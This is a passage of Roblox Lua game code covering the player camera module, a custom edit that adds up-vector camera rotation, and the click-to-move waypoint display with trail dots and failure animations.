			if occlusionMode == Enum.DevCameraOcclusionMode.Invisicam then
				-- Optimization to only send Invisicam what we know it needs
				if Players.LocalPlayer.Character then
					self.activeOcclusionModule:CharacterAdded(Players.LocalPlayer.Character, Players.LocalPlayer )
				end
			else
				-- When Poppercam is enabled, we send it all existing player characters for its raycast ignore list
				for _, player in pairs(Players:GetPlayers()) do
					if player and player.Character then
						self.activeOcclusionModule:CharacterAdded(player.Character, player)
					end
				end
				self.activeOcclusionModule:OnCameraSubjectChanged(game.Workspace.CurrentCamera.CameraSubject)
			end
	
			-- Activate new choice
			self.activeOcclusionModule:Enable(true)
		end
	end
	
	-- When supplied, legacyCameraType is used and cameraMovementMode is ignored (should be nil anyways)
	-- Next, if userCameraCreator is passed in, that is used as the cameraCreator
	function CameraModule:ActivateCameraController(cameraMovementMode, legacyCameraType)
		local newCameraCreator = nil
	
		if legacyCameraType~=nil then
			--[[
				This function has been passed a CameraType enum value. Some of these map to the use of
				the LegacyCamera module, the value "Custom" will be translated to a movementMode enum
				value based on Dev and User settings, and "Scriptable" will disable the camera controller.
			--]]
	
			if legacyCameraType == Enum.CameraType.Scriptable then
				if self.activeCameraController then
					self.activeCameraController:Enable(false)
					self.activeCameraController = nil
					return
				end
			elseif legacyCameraType == Enum.CameraType.Custom then
				cameraMovementMode = self:GetCameraMovementModeFromSettings()
	
			elseif legacyCameraType == Enum.CameraType.Track then
				-- Note: The TrackCamera module was basically an older, less fully-featured
				-- version of ClassicCamera, no longer actively maintained, but it is re-implemented in
				-- case a game was dependent on its lack of ClassicCamera's extra functionality.
				cameraMovementMode = Enum.ComputerCameraMovementMode.Classic
	
			elseif legacyCameraType == Enum.CameraType.Follow then
				cameraMovementMode = Enum.ComputerCameraMovementMode.Follow
	
			elseif legacyCameraType == Enum.CameraType.Orbital then
				cameraMovementMode = Enum.ComputerCameraMovementMode.Orbital
	
			elseif legacyCameraType == Enum.CameraType.Attach or
				   legacyCameraType == Enum.CameraType.Watch or
				   legacyCameraType == Enum.CameraType.Fixed then
				newCameraCreator = LegacyCamera
			else
				warn("CameraScript encountered an unhandled Camera.CameraType value: ",legacyCameraType)
			end
		end
	
		if not newCameraCreator then
			if cameraMovementMode == Enum.ComputerCameraMovementMode.Classic or
				cameraMovementMode == Enum.ComputerCameraMovementMode.Follow or
				cameraMovementMode == Enum.ComputerCameraMovementMode.Default or
				(FFlagUserCameraToggle and cameraMovementMode == Enum.ComputerCameraMovementMode.CameraToggle) then
				newCameraCreator = ClassicCamera
			elseif cameraMovementMode == Enum.ComputerCameraMovementMode.Orbital then
				newCameraCreator = OrbitalCamera
			else
				warn("ActivateCameraController did not select a module.")
				return
			end
		end
	
		-- Create the camera control module we need if it does not already exist in instantiatedCameraControllers
		local newCameraController
		if not instantiatedCameraControllers[newCameraCreator] then
			newCameraController = newCameraCreator.new()
			instantiatedCameraControllers[newCameraCreator] = newCameraController
		else
			newCameraController = instantiatedCameraControllers[newCameraCreator]
		end
	
		-- If there is a controller active and it's not the one we need, disable it,
		-- if it is the one we need, make sure it's enabled
		if self.activeCameraController then
			if self.activeCameraController ~= newCameraController then
				self.activeCameraController:Enable(false)
				self.activeCameraController = newCameraController
				self.activeCameraController:Enable(true)
			elseif not self.activeCameraController:GetEnabled() then
				self.activeCameraController:Enable(true)
			end
		elseif newCameraController ~= nil then
			self.activeCameraController = newCameraController
			self.activeCameraController:Enable(true)
		end
	
		if self.activeCameraController then
			if cameraMovementMode~=nil then
				self.activeCameraController:SetCameraMovementMode(cameraMovementMode)
			elseif legacyCameraType~=nil then
				-- Note that this is only called when legacyCameraType is not a type that
				-- was convertible to a ComputerCameraMovementMode value, i.e. really only applies to LegacyCamera
				self.activeCameraController:SetCameraType(legacyCameraType)
			end
		end
	end
	
	-- Note: The active transparency controller could be made to listen for this event itself.
	function CameraModule:OnCameraSubjectChanged()
		if self.activeTransparencyController then
			self.activeTransparencyController:SetSubject(game.Workspace.CurrentCamera.CameraSubject)
		end
	
		if self.activeOcclusionModule then
			self.activeOcclusionModule:OnCameraSubjectChanged(game.Workspace.CurrentCamera.CameraSubject)
		end
	end
	
	function CameraModule:OnCameraTypeChanged(newCameraType)
		if newCameraType == Enum.CameraType.Scriptable then
			if UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter then
				UserInputService.MouseBehavior = Enum.MouseBehavior.Default
			end
		end
	
		-- Forward the change to ActivateCameraController to handle
		self:ActivateCameraController(nil, newCameraType)
	end
	
	-- Note: Called whenever workspace.CurrentCamera changes, but also on initialization of this script
	function CameraModule:OnCurrentCameraChanged()
		local currentCamera = game.Workspace.CurrentCamera
		if not currentCamera then return end
	
		if self.cameraSubjectChangedConn then
			self.cameraSubjectChangedConn:Disconnect()
		end
	
		if self.cameraTypeChangedConn then
			self.cameraTypeChangedConn:Disconnect()
		end
	
		self.cameraSubjectChangedConn = currentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
			self:OnCameraSubjectChanged(currentCamera.CameraSubject)
		end)
	
		self.cameraTypeChangedConn = currentCamera:GetPropertyChangedSignal("CameraType"):Connect(function()
			self:OnCameraTypeChanged(currentCamera.CameraType)
		end)
	
		self:OnCameraSubjectChanged(currentCamera.CameraSubject)
		self:OnCameraTypeChanged(currentCamera.CameraType)
	end
	
	function CameraModule:OnLocalPlayerCameraPropertyChanged(propertyName)
		if propertyName == "CameraMode" then
			-- CameraMode is only used to turn on/off forcing the player into first person view. The
			-- Note: The case "Classic" is used for all other views and does not correspond only to the ClassicCamera module
			if Players.LocalPlayer.CameraMode == Enum.CameraMode.LockFirstPerson then
				-- Locked in first person, use ClassicCamera which supports this
				if not self.activeCameraController or self.activeCameraController:GetModuleName() ~= "ClassicCamera" then
					self:ActivateCameraController(CameraUtils.ConvertCameraModeEnumToStandard(Enum.DevComputerCameraMovementMode.Classic))
				end
	
				if self.activeCameraController then
					self.activeCameraController:UpdateForDistancePropertyChange()
				end
			elseif Players.LocalPlayer.CameraMode == Enum.CameraMode.Classic then
				-- Not locked in first person view
				local cameraMovementMode =self: GetCameraMovementModeFromSettings()
				self:ActivateCameraController(CameraUtils.ConvertCameraModeEnumToStandard(cameraMovementMode))
			else
				warn("Unhandled value for property player.CameraMode: ",Players.LocalPlayer.CameraMode)
			end
	
		elseif propertyName == "DevComputerCameraMode" or 
			   propertyName == "DevTouchCameraMode" then
			local cameraMovementMode = self:GetCameraMovementModeFromSettings()
			self:ActivateCameraController(CameraUtils.ConvertCameraModeEnumToStandard(cameraMovementMode))
	
		elseif propertyName == "DevCameraOcclusionMode" then
			self:ActivateOcclusionModule(Players.LocalPlayer.DevCameraOcclusionMode)
	
		elseif propertyName == "CameraMinZoomDistance" or propertyName == "CameraMaxZoomDistance" then
			if self.activeCameraController then
				self.activeCameraController:UpdateForDistancePropertyChange()
			end
		elseif propertyName == "DevTouchMovementMode" then
		elseif propertyName == "DevComputerMovementMode" then
		elseif propertyName == "DevEnableMouseLock" then
			-- This is the enabling/disabling of "Shift Lock" mode, not LockFirstPerson (which is a CameraMode)
			-- Note: Enabling and disabling of MouseLock mode is normally only a publish-time choice made via
			-- the corresponding EnableMouseLockOption checkbox of StarterPlayer, and this script does not have
			-- support for changing the availability of MouseLock at runtime (this would require listening to
			-- Player.DevEnableMouseLock changes)
		end
	end
	
	function CameraModule:OnUserGameSettingsPropertyChanged(propertyName)
		if propertyName == 	"ComputerCameraMovementMode" then
			local cameraMovementMode = self:GetCameraMovementModeFromSettings()
			self:ActivateCameraController(CameraUtils.ConvertCameraModeEnumToStandard(cameraMovementMode))
		end
	end
	
	--[[
		Main RenderStep Update. The camera controller and occlusion module both have opportunities
		to set and modify (respectively) the CFrame and Focus before it is set once on CurrentCamera.
		The camera and occlusion modules should only return CFrames, not set the CFrame property of
		CurrentCamera directly.
	--]]
	function CameraModule:Update(dt)
		if self.activeCameraController then
			if FFlagUserCameraToggle then
				self.activeCameraController:UpdateMouseBehavior()
			end
	
			local newCameraCFrame, newCameraFocus = self.activeCameraController:Update(dt)
			self.activeCameraController:ApplyVRTransform()
			if self.activeOcclusionModule then
				newCameraCFrame, newCameraFocus = self.activeOcclusionModule:Update(dt, newCameraCFrame, newCameraFocus)
			end
	
			-- Here is where the new CFrame and Focus are set for this render frame
			game.Workspace.CurrentCamera.CFrame = newCameraCFrame
			game.Workspace.CurrentCamera.Focus = newCameraFocus
	
			-- Update to character local transparency as needed based on camera-to-subject distance
			if self.activeTransparencyController then
				self.activeTransparencyController:Update()
			end
		end
	end
	
	-- Formerly getCurrentCameraMode, this function resolves developer and user camera control settings to
	-- decide which camera control module should be instantiated. The old method of converting redundant enum types
	function CameraModule:GetCameraControlChoice()
		local player = Players.LocalPlayer
	
		if player then
			if self.lastInputType == Enum.UserInputType.Touch or UserInputService.TouchEnabled then
				-- Touch
				if player.DevTouchCameraMode == Enum.DevTouchCameraMovementMode.UserChoice then
					return CameraUtils.ConvertCameraModeEnumToStandard( UserGameSettings.TouchCameraMovementMode )
				else
					return CameraUtils.ConvertCameraModeEnumToStandard( player.DevTouchCameraMode )
				end
			else
				-- Computer
				if player.DevComputerCameraMode == Enum.DevComputerCameraMovementMode.UserChoice then
					local computerMovementMode = CameraUtils.ConvertCameraModeEnumToStandard(UserGameSettings.ComputerCameraMovementMode)
					return CameraUtils.ConvertCameraModeEnumToStandard(computerMovementMode)
				else
					return CameraUtils.ConvertCameraModeEnumToStandard(player.DevComputerCameraMode)
				end
			end
		end
	end
	
	function CameraModule:OnCharacterAdded(char, player)
		if self.activeOcclusionModule then
			self.activeOcclusionModule:CharacterAdded(char, player)
		end
	end
	
	function CameraModule:OnCharacterRemoving(char, player)
		if self.activeOcclusionModule then
			self.activeOcclusionModule:CharacterRemoving(char, player)
		end
	end
	
	function CameraModule:OnPlayerAdded(player)
		player.CharacterAdded:Connect(function(char)
			self:OnCharacterAdded(char, player)
		end)
		player.CharacterRemoving:Connect(function(char)
			self:OnCharacterRemoving(char, player)
		end)
	end
	
	function CameraModule:OnMouseLockToggled()
		if self.activeMouseLockController then
			local mouseLocked = self.activeMouseLockController:GetIsMouseLocked()
			local mouseLockOffset = self.activeMouseLockController:GetMouseLockOffset()
			if self.activeCameraController then
				self.activeCameraController:SetIsMouseLocked(mouseLocked)
				self.activeCameraController:SetMouseLockOffset(mouseLockOffset)
			end
		end
	end
	--begin edit
	local Camera = CameraModule
	local IDENTITYCF = CFrame.new()
	local lastUpCFrame = IDENTITYCF
	
	Camera.UpVector = Vector3.new(0, 1, 0)
	Camera.TransitionRate = 0.15
	Camera.UpCFrame = IDENTITYCF
	
	function Camera:GetUpVector(oldUpVector)
		return oldUpVector
	end
	local function getRotationBetween(u, v, axis)
		local dot, uxv = u:Dot(v), u:Cross(v)
		if (dot < -0.99999) then return CFrame.fromAxisAngle(axis, math.pi) end
		return CFrame.new(0, 0, 0, uxv.x, uxv.y, uxv.z, 1 + dot)
	end
	function Camera:CalculateUpCFrame()
		local oldUpVector = self.UpVector
		local newUpVector = self:GetUpVector(oldUpVector)
		
		local backup = game.Workspace.CurrentCamera.CFrame.RightVector
		local transitionCF = getRotationBetween(oldUpVector, newUpVector, backup)
		local vecSlerpCF = IDENTITYCF:Lerp(transitionCF, self.TransitionRate)
		
		self.UpVector = vecSlerpCF * oldUpVector
		self.UpCFrame = vecSlerpCF * self.UpCFrame
		
		lastUpCFrame = self.UpCFrame
	end
	
	function Camera:Update(dt)
		if self.activeCameraController then
			if Camera.FFlagUserCameraToggle then
				self.activeCameraController:UpdateMouseBehavior()
			end
			
			local newCameraCFrame, newCameraFocus = self.activeCameraController:Update(dt)
			self.activeCameraController:ApplyVRTransform()
			
			self:CalculateUpCFrame()
			self.activeCameraController:UpdateUpCFrame(self.UpCFrame)
			
			-- undo shift-lock offset
	
			local lockOffset = Vector3.new(0, 0, 0)
			if (self.activeMouseLockController and self.activeMouseLockController:GetIsMouseLocked()) then
				lockOffset = self.activeMouseLockController:GetMouseLockOffset()
			end
			
			local offset = newCameraFocus:ToObjectSpace(newCameraCFrame)
			local camRotation = self.UpCFrame * offset
			newCameraFocus = newCameraFocus - newCameraCFrame:VectorToWorldSpace(lockOffset) + camRotation:VectorToWorldSpace(lockOffset)
			newCameraCFrame = newCameraFocus * camRotation
			
			--local offset = newCameraFocus:Inverse() * newCameraCFrame
			--newCameraCFrame = newCameraFocus * self.UpCFrame * offset
			
			if (self.activeCameraController.lastCameraTransform) then
				self.activeCameraController.lastCameraTransform = newCameraCFrame
				self.activeCameraController.lastCameraFocus = newCameraFocus
			end
			
			if self.activeOcclusionModule then
				newCameraCFrame, newCameraFocus = self.activeOcclusionModule:Update(dt, newCameraCFrame, newCameraFocus)
			end
	
			game.Workspace.CurrentCamera.CFrame = newCameraCFrame
			game.Workspace.CurrentCamera.Focus = newCameraFocus
	
			if self.activeTransparencyController then
				self.activeTransparencyController:Update()
			end
		end
	end
	
	function Camera:IsFirstPerson()
		if self.activeCameraController then
			return self.activeCameraController:InFirstPerson()
		end
		return false
	end
	
	function Camera:IsMouseLocked()
		if self.activeCameraController then
			return self.activeCameraController:GetIsMouseLocked()
		end
		return false
	end
	function Camera:IsToggleMode()
		if self.activeCameraController then
			return self.activeCameraController.isCameraToggle
		end
		return false
	end
	function Camera:IsCamRelative()
		return self:IsMouseLocked() or self:IsFirstPerson()
		--return self:IsToggleMode(), self:IsMouseLocked(), self:IsFirstPerson()
	end
	--
	local Utils = _CameraUtils()
	function Utils.GetAngleBetweenXZVectors(v1, v2)
		local upCFrame = lastUpCFrame
		v1 = upCFrame:VectorToObjectSpace(v1)
		v2 = upCFrame:VectorToObjectSpace(v2)
		return math.atan2(v2.X*v1.Z-v2.Z*v1.X, v2.X*v1.X+v2.Z*v1.Z)
	end
	--end edit
	local cameraModuleObject = CameraModule.new()
	local cameraApi = {}
	return cameraModuleObject
end

function _ClickToMoveDisplay()
	local ClickToMoveDisplay = {}
	
	local FAILURE_ANIMATION_ID = "rbxassetid://2874840706"
	
	local TrailDotIcon = "rbxasset://textures/ui/traildot.png"
	local EndWaypointIcon = "rbxasset://textures/ui/waypoint.png"
	
	local WaypointsAlwaysOnTop = false
	
	local WAYPOINT_INCLUDE_FACTOR = 2
	local LAST_DOT_DISTANCE = 3
	
	local WAYPOINT_BILLBOARD_SIZE = UDim2.new(0, 1.68 * 25, 0, 2 * 25)
	
	local ENDWAYPOINT_SIZE_OFFSET_MIN = Vector2.new(0, 0.5)
	local ENDWAYPOINT_SIZE_OFFSET_MAX = Vector2.new(0, 1)
	
	local FAIL_WAYPOINT_SIZE_OFFSET_CENTER = Vector2.new(0, 0.5)
	local FAIL_WAYPOINT_SIZE_OFFSET_LEFT = Vector2.new(0.1, 0.5)
	local FAIL_WAYPOINT_SIZE_OFFSET_RIGHT = Vector2.new(-0.1, 0.5)
	
	local FAILURE_TWEEN_LENGTH = 0.125
	local FAILURE_TWEEN_COUNT = 4
	
	local TWEEN_WAYPOINT_THRESHOLD = 5
	
	local TRAIL_DOT_PARENT_NAME = "ClickToMoveDisplay"
	
	local TrailDotSize = Vector2.new(1.5, 1.5)
	
	local TRAIL_DOT_MIN_SCALE = 1
	local TRAIL_DOT_MIN_DISTANCE = 10
	local TRAIL_DOT_MAX_SCALE = 2.5
	local TRAIL_DOT_MAX_DISTANCE = 100
	
	local PlayersService = game:GetService("Players")
	local TweenService = game:GetService("TweenService")
	local RunService = game:GetService("RunService")
	local Workspace = game:GetService("Workspace")
	
	local LocalPlayer = PlayersService.LocalPlayer
	
	local function CreateWaypointTemplates()
		local TrailDotTemplate = Instance.new("Part")
		TrailDotTemplate.Size = Vector3.new(1, 1, 1)
		TrailDotTemplate.Anchored = true
		TrailDotTemplate.CanCollide = false
		TrailDotTemplate.Name = "TrailDot"
		TrailDotTemplate.Transparency = 1
		local TrailDotImage = Instance.new("ImageHandleAdornment")
		TrailDotImage.Name = "TrailDotImage"
		TrailDotImage.Size = TrailDotSize
		TrailDotImage.SizeRelativeOffset = Vector3.new(0, 0, -0.1)
		TrailDotImage.AlwaysOnTop = WaypointsAlwaysOnTop
		TrailDotImage.Image = TrailDotIcon
		TrailDotImage.Adornee = TrailDotTemplate
		TrailDotImage.Parent = TrailDotTemplate
	
		local EndWaypointTemplate = Instance.new("Part")
		EndWaypointTemplate.Size = Vector3.new(2, 2, 2)
		EndWaypointTemplate.Anchored = true
		EndWaypointTemplate.CanCollide = false
		EndWaypointTemplate.Name = "EndWaypoint"
		EndWaypointTemplate.Transparency = 1
		local EndWaypointImage = Instance.new("ImageHandleAdornment")
		EndWaypointImage.Name = "TrailDotImage"
		EndWaypointImage.Size = TrailDotSize
		EndWaypointImage.SizeRelativeOffset = Vector3.new(0, 0, -0.1)
		EndWaypointImage.AlwaysOnTop = WaypointsAlwaysOnTop
		EndWaypointImage.Image = TrailDotIcon
		EndWaypointImage.Adornee = EndWaypointTemplate
		EndWaypointImage.Parent = EndWaypointTemplate
		local EndWaypointBillboard = Instance.new("BillboardGui")
		EndWaypointBillboard.Name = "EndWaypointBillboard"
		EndWaypointBillboard.Size = WAYPOINT_BILLBOARD_SIZE
		EndWaypointBillboard.LightInfluence = 0
		EndWaypointBillboard.SizeOffset = ENDWAYPOINT_SIZE_OFFSET_MIN
		EndWaypointBillboard.AlwaysOnTop = true
		EndWaypointBillboard.Adornee = EndWaypointTemplate
		EndWaypointBillboard.Parent = EndWaypointTemplate
		local EndWaypointImageLabel = Instance.new("ImageLabel")
		EndWaypointImageLabel.Image = EndWaypointIcon
		EndWaypointImageLabel.BackgroundTransparency = 1
		EndWaypointImageLabel.Size = UDim2.new(1, 0, 1, 0)
		EndWaypointImageLabel.Parent = EndWaypointBillboard
	
	
		local FailureWaypointTemplate = Instance.new("Part")
		FailureWaypointTemplate.Size = Vector3.new(2, 2, 2)
		FailureWaypointTemplate.Anchored = true
		FailureWaypointTemplate.CanCollide = false
		FailureWaypointTemplate.Name = "FailureWaypoint"
		FailureWaypointTemplate.Transparency = 1
		local FailureWaypointImage = Instance.new("ImageHandleAdornment")
		FailureWaypointImage.Name = "TrailDotImage"
		FailureWaypointImage.Size = TrailDotSize
		FailureWaypointImage.SizeRelativeOffset = Vector3.new(0, 0, -0.1)
		FailureWaypointImage.AlwaysOnTop = WaypointsAlwaysOnTop
		FailureWaypointImage.Image = TrailDotIcon
		FailureWaypointImage.Adornee = FailureWaypointTemplate
		FailureWaypointImage.Parent = FailureWaypointTemplate
		local FailureWaypointBillboard = Instance.new("BillboardGui")
		FailureWaypointBillboard.Name = "FailureWaypointBillboard"
		FailureWaypointBillboard.Size = WAYPOINT_BILLBOARD_SIZE
		FailureWaypointBillboard.LightInfluence = 0
		FailureWaypointBillboard.SizeOffset = FAIL_WAYPOINT_SIZE_OFFSET_CENTER
		FailureWaypointBillboard.AlwaysOnTop = true
		FailureWaypointBillboard.Adornee = FailureWaypointTemplate
		FailureWaypointBillboard.Parent = FailureWaypointTemplate
		local FailureWaypointFrame = Instance.new("Frame")
		FailureWaypointFrame.BackgroundTransparency = 1
		FailureWaypointFrame.Size = UDim2.new(0, 0, 0, 0)
		FailureWaypointFrame.Position = UDim2.new(0.5, 0, 1, 0)
		FailureWaypointFrame.Parent = FailureWaypointBillboard
		local FailureWaypointImageLabel = Instance.new("ImageLabel")
		FailureWaypointImageLabel.Image = EndWaypointIcon
		FailureWaypointImageLabel.BackgroundTransparency = 1
		FailureWaypointImageLabel.Position = UDim2.new(
			0, -WAYPOINT_BILLBOARD_SIZE.X.Offset/2, 0, -WAYPOINT_BILLBOARD_SIZE.Y.Offset
		)
		FailureWaypointImageLabel.Size = WAYPOINT_BILLBOARD_SIZE
		FailureWaypointImageLabel.Parent = FailureWaypointFrame
	
		return TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate
	end
	
	local TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()
	
	local function getTrailDotParent()
		local camera = Workspace.CurrentCamera
		local trailParent = camera:FindFirstChild(TRAIL_DOT_PARENT_NAME)
		if not trailParent then
			trailParent = Instance.new("Model")
			trailParent.Name = TRAIL_DOT_PARENT_NAME
			trailParent.Parent = camera
		end
		return trailParent
	end
	
	local function placePathWaypoint(waypointModel, position)
		local ray = Ray.new(position + Vector3.new(0, 2.5, 0), Vector3.new(0, -10, 0))
		local hitPart, hitPoint, hitNormal = Workspace:FindPartOnRayWithIgnoreList(
			ray,
			{ Workspace.CurrentCamera, LocalPlayer.Character }
		)
		if hitPart then
			waypointModel.CFrame = CFrame.new(hitPoint, hitPoint + hitNormal)
			waypointModel.Parent = getTrailDotParent()
		end
	end
	
	local TrailDot = {}
	TrailDot.__index = TrailDot
	
	function TrailDot:Destroy()
		self.DisplayModel:Destroy()
	end
	
	function TrailDot:NewDisplayModel(position)
		local newDisplayModel = TrailDotTemplate:Clone()
		placePathWaypoint(newDisplayModel, position)
		return newDisplayModel
	end
	
	function TrailDot.new(position, closestWaypoint)
		local self = setmetatable({}, TrailDot)
	
		self.DisplayModel = self:NewDisplayModel(position)
		self.ClosestWayPoint = closestWaypoint
	
		return self
	end
	
	local EndWaypoint = {}
	EndWaypoint.__index = EndWaypoint
	
	function EndWaypoint:Destroy()
		self.Destroyed = true
		self.Tween:Cancel()
		self.DisplayModel:Destroy()
	end
	
	function EndWaypoint:NewDisplayModel(position)
		local newDisplayModel = EndWaypointTemplate:Clone()
		placePathWaypoint(newDisplayModel, position)
		return newDisplayModel
	end
	
	function EndWaypoint:CreateTween()
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, -1, true)
		local tween = TweenService:Create(
			self.DisplayModel.EndWaypointBillboard,
			tweenInfo,
			{ SizeOffset = ENDWAYPOINT_SIZE_OFFSET_MAX }
		)
		tween:Play()
		return tween
	end
	
	function EndWaypoint:TweenInFrom(originalPosition)
		local currentPositon = self.DisplayModel.Position
		local studsOffset = originalPosition - currentPositon
		self.DisplayModel.EndWaypointBillboard.StudsOffset = Vector3.new(0, studsOffset.Y, 0)
		local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
		local tween = TweenService:Create(
			self.DisplayModel.EndWaypointBillboard,
			tweenInfo,
			{ StudsOffset = Vector3.new(0, 0, 0) }
		)
		tween:Play()
		return tween
	end
	
	function EndWaypoint.new(position, closestWaypoint, originalPosition)
		local self = setmetatable({}, EndWaypoint)
	
		self.DisplayModel = self:NewDisplayModel(position)
		self.Destroyed = false
		if originalPosition and (originalPosition - position).magnitude > TWEEN_WAYPOINT_THRESHOLD then
			self.Tween = self:TweenInFrom(originalPosition)
			coroutine.wrap(function()
				self.Tween.Completed:Wait()
				if not self.Destroyed then
					self.Tween = self:CreateTween()
				end
			end)()
		else
			self.Tween = self:CreateTween()
		end
		self.ClosestWayPoint = closestWaypoint
	
		return self
	end
	
	local FailureWaypoint = {}
	FailureWaypoint.__index = FailureWaypoint
	
	function FailureWaypoint:Hide()
		self.DisplayModel.Parent = nil
	end
	
	function FailureWaypoint:Destroy()
		self.DisplayModel:Destroy()
	end
	
	function FailureWaypoint:NewDisplayModel(position)
		local newDisplayModel = FailureWaypointTemplate:Clone()
		placePathWaypoint(newDisplayModel, position)
		local ray = Ray.new(position + Vector3.new(0, 2.5, 0), Vector3.new(0, -10, 0))
		local hitPart, hitPoint, hitNormal = Workspace:FindPartOnRayWithIgnoreList(
			ray, { Workspace.CurrentCamera, LocalPlayer.Character }
		)
		if hitPart then
			newDisplayModel.CFrame = CFrame.new(hitPoint, hitPoint + hitNormal)
			newDisplayModel.Parent = getTrailDotParent()
		end
		return newDisplayModel
	end
	
	function FailureWaypoint:RunFailureTween()
		wait(FAILURE_TWEEN_LENGTH) -- Delay one tween length betfore starting tweening
		-- Tween out from center
		local tweenInfo = TweenInfo.new(FAILURE_TWEEN_LENGTH/2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
		local tweenLeft = TweenService:Create(self.DisplayModel.FailureWaypointBillboard, tweenInfo,
			{ SizeOffset = FAIL_WAYPOINT_SIZE_OFFSET_LEFT })
		tweenLeft:Play()
	
		local tweenLeftRoation = TweenService:Create(self.DisplayModel.FailureWaypointBillboard.Frame, tweenInfo,
			{ Rotation = 10 })
		tweenLeftRoation:Play()
	
		tweenLeft.Completed:wait()
	
		-- Tween back and forth
		tweenInfo = TweenInfo.new(FAILURE_TWEEN_LENGTH, Enum.EasingStyle.Sine, Enum.EasingDirection.Out,
			FAILURE_TWEEN_COUNT - 1, true)
		local tweenSideToSide = TweenService:Create(self.DisplayModel.FailureWaypointBillboard, tweenInfo,
			{ SizeOffset = FAIL_WAYPOINT_SIZE_OFFSET_RIGHT})
		tweenSideToSide:Play()
	
		-- Tween flash dark and roate left and right
		tweenInfo = TweenInfo.new(FAILURE_TWEEN_LENGTH, Enum.EasingStyle.Sine, Enum.EasingDirection.Out,
			FAILURE_TWEEN_COUNT - 1, true)
		local tweenFlash = TweenService:Create(self.DisplayModel.FailureWaypointBillboard.Frame.ImageLabel, tweenInfo,
			{ ImageColor3 = Color3.new(0.75, 0.75, 0.75)})
		tweenFlash:Play()
	
		local tweenRotate = TweenService:Create(self.DisplayModel.FailureWaypointBillboard.Frame, tweenInfo,
			{ Rotation = -10 })
		tweenRotate:Play()
	
		tweenSideToSide.Completed:wait()
	
		-- Tween back to center
		tweenInfo = TweenInfo.new(FAILURE_TWEEN_LENGTH/2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
		local tweenCenter = TweenService:Create(self.DisplayModel.FailureWaypointBillboard, tweenInfo,
			{ SizeOffset = FAIL_WAYPOINT_SIZE_OFFSET_CENTER })
		tweenCenter:Play()
	
		local tweenRoation = TweenService:Create(self.DisplayModel.FailureWaypointBillboard.Frame, tweenInfo,
			{ Rotation = 0 })
		tweenRoation:Play()
	
		tweenCenter.Completed:wait()
	
		wait(FAILURE_TWEEN_LENGTH) -- Delay one tween length betfore removing
	end
	
	function FailureWaypoint.new(position)
		local self = setmetatable({}, FailureWaypoint)
	
		self.DisplayModel = self:NewDisplayModel(position)
	
		return self
	end
	
	local failureAnimation = Instance.new("Animation")
	failureAnimation.AnimationId = FAILURE_ANIMATION_ID
	
	local lastHumanoid = nil
	local lastFailureAnimationTrack = nil
	
	local function getFailureAnimationTrack(myHumanoid)
		if myHumanoid == lastHumanoid then
			return lastFailureAnimationTrack
		end
		lastFailureAnimationTrack = myHumanoid:LoadAnimation(failureAnimation)
		lastFailureAnimationTrack.Priority = Enum.AnimationPriority.Action
		lastFailureAnimationTrack.Looped = false
		return lastFailureAnimationTrack
	end
	
	local function findPlayerHumanoid()
		local character = LocalPlayer.Character
		if character then
			return character:FindFirstChildOfClass("Humanoid")
		end
	end
	
	local function createTrailDots(wayPoints, originalEndWaypoint)
		local newTrailDots = {}
		local count = 1
		for i = 1, #wayPoints - 1 do
			local closeToEnd = (wayPoints[i].Position - wayPoints[#wayPoints].Position).magnitude < LAST_DOT_DISTANCE
			local includeWaypoint = i % WAYPOINT_INCLUDE_FACTOR == 0 and not closeToEnd
			if includeWaypoint then
				local trailDot = TrailDot.new(wayPoints[i].Position, i)
				newTrailDots[count] = trailDot
				count = count + 1
			end
		end
	
		local newEndWaypoint = EndWaypoint.new(wayPoints[#wayPoints].Position, #wayPoints, originalEndWaypoint)
		table.insert(newTrailDots, newEndWaypoint)
	
		local reversedTrailDots = {}
		count = 1
		for i = #newTrailDots, 1, -1 do
			reversedTrailDots[count] = newTrailDots[i]
			count = count + 1
		end
		return reversedTrailDots
	end
	
	local function getTrailDotScale(distanceToCamera, defaultSize)
		local rangeLength = TRAIL_DOT_MAX_DISTANCE - TRAIL_DOT_MIN_DISTANCE
		local inRangePoint = math.clamp(distanceToCamera - TRAIL_DOT_MIN_DISTANCE, 0, rangeLength)/rangeLength
		local scale = TRAIL_DOT_MIN_SCALE + (TRAIL_DOT_MAX_SCALE - TRAIL_DOT_MIN_SCALE)*inRangePoint
		return defaultSize * scale
	end
	
	local createPathCount = 0
	-- originalEndWaypoint is optional, causes the waypoint to tween from that position.
	function ClickToMoveDisplay.CreatePathDisplay(wayPoints, originalEndWaypoint)
		createPathCount = createPathCount + 1
		local trailDots = createTrailDots(wayPoints, originalEndWaypoint)
	
		local function removePathBeforePoint(wayPointNumber)
			-- kill all trailDots before and at wayPointNumber
			for i = #trailDots, 1, -1 do
				local trailDot = trailDots[i]
				if trailDot.ClosestWayPoint <= wayPointNumber then
					trailDot:Destroy()
					trailDots[i] = nil
				else
					break
				end
			end
		end
	
		local reiszeTrailDotsUpdateName = "ClickToMoveResizeTrail" ..createPathCount
		local function resizeTrailDots()
			if #trailDots == 0 then
				RunService:UnbindFromRenderStep(reiszeTrailDotsUpdateName)
				return
			end
			local cameraPos = Workspace.CurrentCamera.CFrame.p
			for i = 1, #trailDots do
				local trailDotImage = trailDots[i].DisplayModel:FindFirstChild("TrailDotImage")
				if trailDotImage then
					local distanceToCamera = (trailDots[i].DisplayModel.Position - cameraPos).magnitude
					trailDotImage.Size = getTrailDotScale(distanceToCamera, TrailDotSize)
				end
			end
		end
		RunService:BindToRenderStep(reiszeTrailDotsUpdateName, Enum.RenderPriority.Camera.Value - 1, resizeTrailDots)
	
		local function removePath()
			removePathBeforePoint(#wayPoints)
		end
	
		return removePath, removePathBeforePoint
	end
	
	local lastFailureWaypoint = nil
	function ClickToMoveDisplay.DisplayFailureWaypoint(position)
		if lastFailureWaypoint then
			lastFailureWaypoint:Hide()
		end
		local failureWaypoint = FailureWaypoint.new(position)
		lastFailureWaypoint = failureWaypoint
		coroutine.wrap(function()
			failureWaypoint:RunFailureTween()
			failureWaypoint:Destroy()
			failureWaypoint = nil
		end)()
	end
	
